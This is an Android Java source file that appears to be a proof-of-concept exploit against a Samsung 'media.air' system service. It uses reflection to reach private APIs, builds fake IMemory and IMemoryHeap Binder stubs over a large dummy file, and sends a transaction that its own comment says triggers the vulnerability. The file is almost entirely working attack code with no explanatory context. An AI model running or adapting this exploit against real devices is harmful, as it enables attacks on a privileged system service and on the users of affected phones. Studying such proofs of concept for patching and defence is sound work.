package com.leadroyal.vesion;

import android.app.Activity;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;

import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class MainActivity extends AppCompatActivity {


    static String getStackTrack() {
        try {
            throw new Throwable();
        } catch (Throwable t) {
            StringWriter writer = new StringWriter();
            PrintWriter pw = new PrintWriter(writer);
            t.printStackTrace(pw);
            return writer.toString();
        }
    }


    static interface IMemoryHeap {
        ParcelFileDescriptor getHeapID();

        int getSize();

        int getFlags();

        int getOffset();
    }

    static class IMemoryHeapStub extends Binder {

        static final String DESCRIPTOR = "android.utils.IMemoryHeap";
        private FileDescriptor mFd;
        private int mOffset;
        private int mSize;
        private int mFlags;

        public static final int READ_ONLY = 0x00000001;

        public IMemoryHeapStub(FileDescriptor fd, int offset, int size, int flags) {
            mFd = fd;
            mOffset = offset;
            mSize = size;
            mFlags = flags;
        }

        static final int HEAD_ID = IBinder.FIRST_CALL_TRANSACTION;

        @Override
        public boolean onTransact(int code, android.os.Parcel data, android.os.Parcel reply, int flags) throws android.os.RemoteException {
            switch (code) {
                case INTERFACE_TRANSACTION: {
                    reply.writeString(DESCRIPTOR);
                    return true;
                }
                case HEAD_ID: {
                    data.enforceInterface(DESCRIPTOR);
                    log("In HEAD_ID: " + getStackTrack());

                    reply.writeFileDescriptor(mFd);
                    reply.writeInt(mSize);
                    reply.writeInt(mFlags);
                    reply.writeInt(mOffset);

                    reply.writeNoException();
                    return true;
                }
            }
            return super.onTransact(code, data, reply, flags);
        }
    }

    static class IMemoryHeapProxy implements IMemoryHeap {
        private boolean mLoaded;
        private int mBase;
        private int mFlags;
        private int mOffset;
        private int mSize;
        private ParcelFileDescriptor mHeapID;
        private IBinder mBinder;
        static int HEAP_ID = IBinder.FIRST_CALL_TRANSACTION;
        static final String DESCRIPTOR = "android.utils.IMemoryHeap";

        private void loadFromProxy() {
            if (!mLoaded) {
                mLoaded = true;
                try {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();

                    data.writeInterfaceToken(DESCRIPTOR);

                    mBinder.transact(HEAP_ID, data, reply, 0);

                    mHeapID = reply.readFileDescriptor();
                    mSize = reply.readInt();
                    mFlags = reply.readInt();
                    mOffset = reply.readInt();
                } catch (RemoteException ex) {
                    log("Exception loading MemoryHeap: " + ex);
                }
            }
        }

        @Override
        public ParcelFileDescriptor getHeapID() {
            loadFromProxy();
            return mHeapID;
        }

        @Override
        public int getSize() {
            loadFromProxy();
            return mSize;
        }

        @Override
        public int getFlags() {
            loadFromProxy();
            return mFlags;
        }

        @Override
        public int getOffset() {
            loadFromProxy();
            return mOffset;
        }

        public IMemoryHeapProxy(IBinder binder) {
            mBinder = binder;
        }
    }

    static class MemoryInfo {
        public int size;
        public int offset;
    }

    static interface IMemory {
        IMemoryHeap getHeap();

        int getSize();

        int getOffset();
    }

    static class IMemoryProxy implements IMemory {
        static final String DESCRIPTOR = "android.utils.IMemory";
        private boolean mLoaded;
        private IBinder mBinder;
        private IMemoryHeap mHeap;
        private int mSize;
        private int mOffset;
        static int GET_MEMORY = IBinder.FIRST_CALL_TRANSACTION;

        public IMemoryProxy(IBinder binder) {
            mBinder = binder;
        }

        private void getMemory() {
            if (!mLoaded) {
                mLoaded = true;
                try {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();

                    data.writeInterfaceToken(DESCRIPTOR);

                    mBinder.transact(GET_MEMORY, data, reply, 0);

                    mHeap = new IMemoryHeapProxy(reply.readStrongBinder());
                    mOffset = reply.readInt();
                    mSize = reply.readInt();
                } catch (RemoteException ex) {
                    log("Exception loading Memory: " + ex);
                }
            }
        }

        @Override
        public IMemoryHeap getHeap() {
            getMemory();
            return mHeap;
        }

        @Override
        public int getSize() {
            getMemory();
            return mSize;
        }

        @Override
        public int getOffset() {
            getMemory();
            return mOffset;
        }
    }

    static class IMemoryStub extends Binder {

        static String DESCRIPTOR = "android.utils.IMemory";
        private IMemoryHeapStub mHeap;
        private int mOffset;
        private int mSize;

        public IMemoryStub(FileDescriptor fd, int offset, int size, int heapoffset, int heapsize, boolean readonly) {
            mHeap = new IMemoryHeapStub(fd, heapoffset, heapsize, readonly ? IMemoryHeapStub.READ_ONLY : 0);
            mOffset = offset;
            mSize = size;
        }

        public IMemoryStub(FileDescriptor fd, int offset, int size) {
            this(fd, offset, size, offset, size, true);
        }

        static final int GET_MEMORY = IBinder.FIRST_CALL_TRANSACTION;

        @Override
        public boolean onTransact(int code, android.os.Parcel data, android.os.Parcel reply, int flags) throws android.os.RemoteException {
            log("onTransact IMemory: " + code);
            switch (code) {
                case INTERFACE_TRANSACTION: {
                    reply.writeString(DESCRIPTOR);
                    return true;
                }
                case GET_MEMORY: {
                    data.enforceInterface(DESCRIPTOR);
                    log("In GET_MEMORY: " + getStackTrack());

                    reply.writeStrongBinder(mHeap);
                    reply.writeInt(mOffset);
                    reply.writeInt(mSize);

                    reply.writeNoException();
                    return true;
                }
            }
            return super.onTransact(code, data, reply, flags);
        }
    }

    static void log(String logString) {
        Log.e("MyClass", logString);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        try {
            ff(null);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
    }

    public void ff(View view) throws ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchMethodException {

        Method method = Class.forName("android.os.ServiceManager").getMethod("getService", String.class);
        IBinder b = (IBinder) method.invoke(null, "media.air");
        //IBinder b = ServiceManager.getService("media.air");
        Parcel in = Parcel.obtain();
        Parcel out = Parcel.obtain();
        in.writeInterfaceToken("com.samsung.air.IAIRService");
        Method m = null;
        IBinder mm = null;
        try {
            m = Activity.class.getDeclaredMethod("getActivityToken");
            m.setAccessible(true);
            mm = (IBinder) m.invoke(this);
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        Log.e("getActivityToken", mm.toString());
        in.writeStrongBinder(mm);
        in.writeInt(1);
        try {
            b.transact(1, in, out, 0);
            Log.e("FUCK", "" + out.readInt());
            IBinder client = out.readStrongBinder();

            // ------ from here ---------


            // send code=3 to trigger init
            Parcel p = Parcel.obtain();
            p.writeInterfaceToken("com.samsung.air.IAIR");
            p.writeInt(0);
            Parcel o = Parcel.obtain();
            client.transact(3, p, o, 0);

            // send code=4 to trigger start
            p = Parcel.obtain();
            p.writeInterfaceToken("com.samsung.air.IAIR");
            o = Parcel.obtain();
            client.transact(4, p, o, 0);

            // prepare an arbitrary sized file to act as java IMemory
            FileOutputStream fos = getApplicationContext().openFileOutput("dummy.bin", 0);
            byte[] obs = new byte[1024 * 1024 * 10];
            for (int i = 0; i < obs.length; ++i) {
                obs[i] = (byte) i;
            }
            fos.write(obs, 0, obs.length);
            fos.close();
            FileInputStream fis = getApplicationContext().openFileInput("dummy.bin");
            IMemoryStub sharedBuffer = new IMemoryStub(fis.getFD(), 0, obs.length);

            // send code=7 to trigger the vuln!
            p = Parcel.obtain();
            p.writeInterfaceToken("com.samsung.air.IAIR");
            p.writeInt(1);
            p.writeStrongBinder(sharedBuffer);
            o = Parcel.obtain();
            client.transact(7, p, o, 0);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
